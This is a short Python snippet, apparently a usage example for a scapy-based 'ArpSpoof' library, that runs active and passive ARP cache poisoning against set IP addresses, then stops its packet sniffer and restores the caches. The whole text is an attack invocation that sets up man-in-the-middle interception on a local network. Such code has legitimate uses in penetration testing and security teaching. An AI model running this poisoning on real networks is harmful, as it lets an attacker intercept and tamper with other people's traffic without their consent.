from ArpSpoof import SpooferARP
from scapy.config import conf

spoofer = SpooferARP('10.110.0.1', '224.0.0.2')
spoofer.active_cache_poisonning()

spoofer = SpooferARP('10.110.0.1', '224.0.0.2', conf.iface, False, 0.5)
spoofer.passive_cache_poisonning(asynchronous=True)
spoofer.run = False
spoofer.sniffer.stop()
spoofer.restore()